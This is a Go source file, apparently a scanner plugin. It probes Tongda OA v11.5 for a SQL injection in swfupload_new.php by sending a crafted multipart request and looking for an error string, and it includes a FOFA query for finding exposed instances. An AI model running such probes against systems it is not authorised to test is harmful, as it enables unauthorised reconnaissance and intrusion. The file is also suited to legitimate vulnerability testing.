package main

import (
	"errors"
	"fmt"
	"github.com/ExpLangcn/HwToolslibrary/library/httpclient"
	"github.com/ExpLangcn/HwToolslibrary/library/info"
	"net/http"
	"strings"
)

var POC info.POC
var Httprecord = make(map[*httpclient.RequestOptions]*httpclient.Response) // 配置请求信息

func init() {
	POC = info.POC{ // 初始化POC信息
		Info: info.POCInfo{
			Name:     "通达OA_v11.5_swfupload_new.php_SQL注入漏洞",
			Author:   "ExpLang",
			Describe: "通达OA_v11.5_swfupload_new.php_文件存在SQL注入漏洞，攻击者通过漏洞可获取服务器敏感信息",
			Date:     "2023-10-08",
			Tags:     []string{"通达OA", "TongdaOA", "sqli", "sql注入"},
			Level:    "high",
			Link:     []string{"https://peiqi.h-k.pw/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.5%20swfupload_new.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html"},
		},
		Other: info.OtherInfo{
			FOFAGrammar:  "app=\"TDXK-通达OA\"",
			QuakeGrammar: "",
		},
	}
}

func Start(Target string, ProxyURL string) (bool, error) {
	// 构建请求体
	requestBody := `------------GFioQpMK0vv2
Content-Disposition: form-data; name="ATTACHMENT_ID"

1
------------GFioQpMK0vv2
Content-Disposition: form-data; name="ATTACHMENT_NAME"

1
------------GFioQpMK0vv2
Content-Disposition: form-data; name="FILE_SORT"

2
------------GFioQpMK0vv2
Content-Disposition: form-data; name="SORT_ID"

------------GFioQpMK0vv2--`

	// 设置请求选项
	requestOptions := &httpclient.RequestOptions{
		Method: http.MethodPost,
		URL:    Target + "/general/file_folder/swfupload_new.php",
		Headers: map[string]string{
			"User-Agent":      httpclient.RandomUserAgent(),
			"Content-Type":    "multipart/form-data; boundary=----------GFioQpMK0vv2",
			"Content-Length":  fmt.Sprintf("%d", len(requestBody)),
			"Accept-Encoding": "gzip",
		},
		ProxyURL:    ProxyURL,
		RequestBody: []byte(requestBody),
	}

	// 发送请求
	responseOption, success := httpclient.SendRequest(*requestOptions)
	Httprecord[requestOptions] = responseOption

	if responseOption.Err != nil {
		// 处理错误
		return false, responseOption.Err
	} else {
		if !success {
			// 发送请求失败
			return false, errors.New("请求失败")
		}
	}

	POC.Info.HttpInfo = Httprecord

	statusCode := responseOption.StatusCode
	if statusCode == http.StatusOK {
		// 检查响应包内容是否包含 "不安全的 SQL语句" 字符串
		responseBody := string(responseOption.Body)
		if strings.Contains(responseBody, "不安全的 SQL语句") {
			return true, nil
		}
	}
	return false, nil
}
